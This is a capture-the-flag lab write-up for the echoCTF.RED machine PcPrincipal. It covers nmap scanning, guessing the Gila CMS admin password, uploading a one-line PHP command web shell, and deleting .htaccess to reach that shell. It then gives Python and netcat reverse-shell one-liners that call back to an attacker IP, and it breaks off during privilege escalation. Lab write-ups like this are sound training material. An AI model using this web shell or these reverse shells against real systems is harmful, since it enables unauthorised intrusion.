---
layout: default
title : muzec - PcPrincipal - echoCTF.RED
---


### Enumeration With Nmap

`nmap -p- --min-rate 10000 -oA nmap/allports -v 10.0.100.32`


```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/pcprincipal]
└─$ cat nmap/allports.nmap                                                       
# Nmap 7.91 scan initiated Sat Dec  4 12:57:02 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.0.100.32
Increasing send delay for 10.0.100.32 from 0 to 5 due to 79 out of 261 dropped probes since last increase.
Warning: 10.0.100.32 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.0.100.32 from 640 to 1000 due to 172 out of 573 dropped probes since last increase.
Nmap scan report for 10.0.100.32
Host is up (0.16s latency).
Not shown: 41913 closed ports, 23621 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec  4 12:58:07 2021 -- 1 IP address (1 host up) scanned in 65.04 seconds
```

Default Script/Service Detection.

`nmap -sC -sV -oA nmap/normal -p 80 10.0.100.32`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/pcprincipal]
└─$ cat nmap/normal.nmap  
# Nmap 7.91 scan initiated Sat Dec  4 12:57:17 2021 as: nmap -sC -sV -oA nmap/normal -p 80 10.0.100.32
Nmap scan report for 10.0.100.32
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec  4 12:57:31 2021 -- 1 IP address (1 host up) scanned in 13.72 seconds
```

Seems we are dealing with HTTP which is cool lol so i can show off some new tools which i found interesting from `echotrust` with out to much of talks let jump in. Now let check what we have on the port 80 .

```
lynx http://10.0.100.32/
```

### Lynx

Lynx is a terminal-based web browser for all Linux distributions. It shows the result as plain text on the terminal. It is a classic non-graphical text-mode web browser which displays the pages on the terminal. Lynx does not load images and multimedia contents, hence it is fast as compared to other browsers.

![image](https://user-images.githubusercontent.com/69868171/145193344-28a3e6b2-12c6-4aae-a294-fbd303be4a6c.png)

Cool right yes i know so we know we are dealing with `gilacms` i look around to see if i can get right version but damn nothing it was well hidden i guess or removed let see if i can guess the admin page.

```
lynx http://10.0.100.32/gila/admin
```

![image](https://user-images.githubusercontent.com/69868171/145194533-1592b2c2-9efc-4547-909a-4708e54d3d72.png)

Boom seems we are right now let hit the browser.

![image](https://user-images.githubusercontent.com/69868171/145195342-90d18c1a-b48b-4fbf-8f54-6f3d37875baa.png)

But man seems we need a credentials i try all the default one but none work so we get a hint let read it.

```
 There is a need to brute force http://pcprincipal.echocity-f.com/ for username and password but it should be easy to find in the 3rd try., The domain you're going to need is @pcprincipal.echocity-f.com and the password is given to you on the frontpage as a domain...
```
Now it getting interesting so we know now that the username is `admin@pcprincipal.echocity-f.com` so for the password we should be able to guess it.

![image](https://user-images.githubusercontent.com/69868171/145196658-8fafdd7e-0d10-4a5d-922e-812df4531982.png)

Mama we are in and guess what we have the version ok they should be a way around to upload a shell to get RCE.

![image](https://user-images.githubusercontent.com/69868171/145197180-8b4b6d80-b13a-4a84-9c3c-f5cb9ed3bacd.png)

Click on content > file manager .

![image](https://user-images.githubusercontent.com/69868171/145197634-95e53811-ac1d-4bea-8920-93e48f9b74fc.png)

We have the `config.php` file but not that helpful let try uploading a php file and see.

![image](https://user-images.githubusercontent.com/69868171/145198159-7117995b-1ce1-40a5-b441-52be02a537c4.png)

Bournce back hmmm seems we have no permission to upload file there let find a place which we can abuse to upload our malicious file.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/pcprincipal]
└─$ vi shell.php           
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/pcprincipal]
└─$ cat shell.php       
<?php system ($_GET['cmd']) ?>
```

Now we just need a place to upload it look through folder and i was able to upload on the `tmp` folder which is cool.

![image](https://user-images.githubusercontent.com/69868171/145200606-6641f048-7ddd-4993-ada5-63993b49099a.png)


Now let try to access it from outside but man i got `403 forbidden` .

![image](https://user-images.githubusercontent.com/69868171/145200911-88828c9f-4d1c-4267-a707-cc451175d837.png)

Let try see if i can modified the `.htaccess` or delete it. Trying to edit no luck but delete yes luck lol.

![image](https://user-images.githubusercontent.com/69868171/145204395-073e8d0d-6ca7-4e0e-9d8b-d1f0ba39ba67.png)

Deleted now let try to access it.

![image](https://user-images.githubusercontent.com/69868171/145204480-c0b72047-03dd-407a-8c65-0a5c5e6aaafb.png)

Boom we can execute a command on the remote host now let get back a reverse shell back to our terminal.

### Python One Liner Reverse shell Or Ncat.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.
```

OR

```
nc -e /bin/bash 10.10.10.0 1337
```

Now back to check our listener.

![image](https://user-images.githubusercontent.com/69868171/145205274-12f67dbc-792c-417a-945a-d426a34dcf6b.png)

Now we have shell which is cool let check kernal version and some other stuffs and way to move our privilege to root.

![image](https://user-images.githubusercontent.com/69868171/145205718-87b5e6e3-6b9e-4000-9dcd-e8c826c66dd6.png)

Quite alright it running debian cool let check some running processes.

```
www-data@pcprincipal:/var/www/html/gila/tmp$ ps -auxwwwwww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   3732  2816 ?        Ss   Dec07   0:00 /bin/bash /entrypoint.sh tail -f /var/log/supervisor/supervisord.log /var/log/supervisor/confd.log
root        42  0.0  0.0   2384  1640 ?        S    Dec07   0:00 /bin/sh /usr/bin/mysqld_safe
mysql      159  0.0  3.9 1255420 81816 ?       Sl   Dec07   0:25 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
root       160  0.0  0.0   4704  1072 ?        S    Dec07   0:00 logger -t mysqld -p daemon error
root       234  0.0  0.3  15848  6960 ?        Ss   Dec07   0:00 /usr/sbin/sshd
root       237  0.0  0.1   8492  3108 ?        Ss   Dec07   0:00 tmux new -d -s 0 /usr/bin/etcd
root       238  0.2  1.1 11201756 24300 pts/0  Ssl+ Dec07   2:47 /usr/bin/etcd
root       284  0.0  0.1   3780  2920 pts/1    Ss+  Dec07   0:00 /bin/bash /usr/local/bin/etcd-feeder.sh
root       318  0.0  1.0 215060 21400 ?        Ss   Dec07   0:02 /usr/sbin/apache2 -k start
www-data   321  0.0  0.7 215400 16208 ?        S    Dec07   0:00 /usr/sbin/apache2 -k start
www-data   322  0.0  0.7 215304 15844 ?        S    Dec07   0:01 /usr/sbin/apache2 -k start
www-data   323  0.0  0.7 215404 16244 ?        S    Dec07   0:00 /usr/sbin/apache2 -k start
www-data   324  0.0  0.7 215400 15432 ?        S    Dec07   0:01 /usr/sbin/apache2 -k start
www-data   325  0.0  0.7 215400 16072 ?        S    Dec07   0:00 /usr/sbin/apache2 -k start
root       337  0.0  0.8  26752 16868 ?        Ss   Dec07   0:07 /usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
root       339  0.0  0.0   2384   736 ?        S    Dec07   0:00 /bin/sh -c rm -f /etc/confd/conf.d/etsctf_authorized_keys.toml; install -o root -g root -m 0666 /etc/confd/conf.d/etsctf_authorized_keys.toml.bk /etc/confd/conf.d/etsctf_authorized_keys.toml; /work/src/github.com/kelseyhightower/confd/bin/confd
root       347  0.0  0.0   2324   724 ?        S    Dec07   0:02 tail -f /var/log/supervisor/supervisord.log /var/log/supervisor/confd.log
root       348  0.0  1.0 645516 21508 ?        Sl   Dec07   0:09 /work/src/github.com/kelseyhightower/confd/bin/confd
www-data  1643  0.0  0.7 215400 16308 ?        S    Dec07   0:01 /usr/sbin/apache2 -k start
www-data 10791  0.0  0.7 215400 15756 ?        S    11:06   0:00 /usr/sbin/apache2 -k start
www-data 12894  0.0  0.0   2384   736 ?        S    12:00   0:00 sh -c nc -e /bin/bash 10.10.0.186 1337
www-data 12895  0.0  0.1   3732  2668 ?        S    12:00   0:00 bash
www-data 12897  0.0  0.3  14064  8060 ?        S    12:00   0:00 python3 -c import pty; pty.spawn('/bin/bash')
www-data 12898  0.0  0.1   4092  3316 pts/2    Ss   12:00   0:00 /bin/bash
root     13006  0.0  0.0   2292   724 pts/1    S+   12:03   0:00 sleep 360
www-data 13155  0.0  0.1   7864  2812 pts/2    R+   12:07   0:00 ps -auxwwwwww
www-data@pcprincipal:/var/www/html/gila/tmp$ 
```

Some strange process `confd` seems we need to focus on that 
